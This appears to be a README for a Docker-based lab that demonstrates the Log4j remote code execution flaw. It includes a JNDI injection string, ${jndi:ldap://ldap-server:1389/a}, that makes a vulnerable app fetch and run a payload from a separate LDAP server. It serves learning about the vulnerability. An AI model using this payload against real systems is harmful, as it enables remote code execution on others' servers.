# Log4j POC
Proof of concept for the Log4j vulnerability (using docker containers).

Log4j is a logging library which is widely used in Java applications. All versions of the library from 2.0 to 2.17.0 (excluding 2.3.2 and 2.12.4) are vulnerable to remote code execution. In order to exploit this vulnerability, user input must be part of a log message.

## Requirements

Install the following requirements:

* Docker Engine
* docker-compose

## Usage

* Start the docker containers:
```
$ docker-compose up

Creating ldap-server    ... done
Creating vulnerable-app ... done
Attaching to ldap-server, vulnerable-app
ldap-server       | Enter: ${jndi:ldap://ldap-server:1389/a}
ldap-server       | Staring LDAP server: 0.0.0.0:1389
ldap-server       | Starting web server: 0.0.0.0:8000
ldap-server       | Listening on 0.0.0.0:1389
vulnerable-app    | 
vulnerable-app    |   .   ____          _            __ _ _
vulnerable-app    |  /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
vulnerable-app    | ( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
vulnerable-app    |  \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
vulnerable-app    |   '  |____| .__|_| |_|_| |_\__, | / / / /
vulnerable-app    |  =========|_|==============|___/=/_/_/_/
vulnerable-app    |  :: Spring Boot ::                (v2.6.1)
vulnerable-app    |
```

The docker-compose script will setup the LDAP server (including a web server) and a vulnerable application.

The vulnerable application runs on port 8080. The LDAP server runs on port 1389 and redirects to the web server on port 8000. This web server hosts a compiled version of the payload (ldap-server/Exploit.java).

## Demo

![screenshot](https://github.com/wesleydekraker/log4j-poc/blob/master/screenshot.png?raw=true)

* Go to: http://localhost:8080
* Enter username: ${jndi:ldap://ldap-server:1389/a}
* Enter password: test
* Submit form
* docker exec -it vulnerable-app ls -al

The ls command should show the file: hello.txt. This file is created by the payload (ldap-server/Exploit.java).


## Disclaimer

This repository is not designed for malicious use. The purpose is to help people learn more about this vulnerability.

